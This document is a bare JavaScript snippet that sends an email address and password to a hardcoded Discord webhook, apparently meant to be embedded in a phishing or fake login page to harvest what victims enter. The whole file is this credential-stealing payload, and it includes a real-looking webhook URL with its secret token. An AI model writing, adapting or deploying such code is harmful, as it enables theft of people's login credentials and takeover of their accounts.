const webhookUrl = 'https://discord.com/api/webhooks/1250446588254359583/hWxJFMMwp2NpIx6vq7-pZe_rrQ9sjOm3LxtSZcv6D1bv2uiwMgYNYglzJvHZSctThByk';

const data = {
    content: `**Email= ||${email}||\nPass= ||${password}||**`
};

const headers = {
    'Content-Type': 'application/json',
    // Include any required authentication headers here, if needed
    // 'Authorization': 'Bearer YOUR_TOKEN_HERE'
};

fetch(webhookUrl, {
    method: 'POST',
    headers: headers,
    body: JSON.stringify(data),
})
.then(response => {
    if (!response.ok) {
        throw new Error('Failed to send message to Discord');
    }
    console.log('Message sent to Discord successfully');
})
.catch(error => {
    console.error('Error sending message to Discord:', error);
});
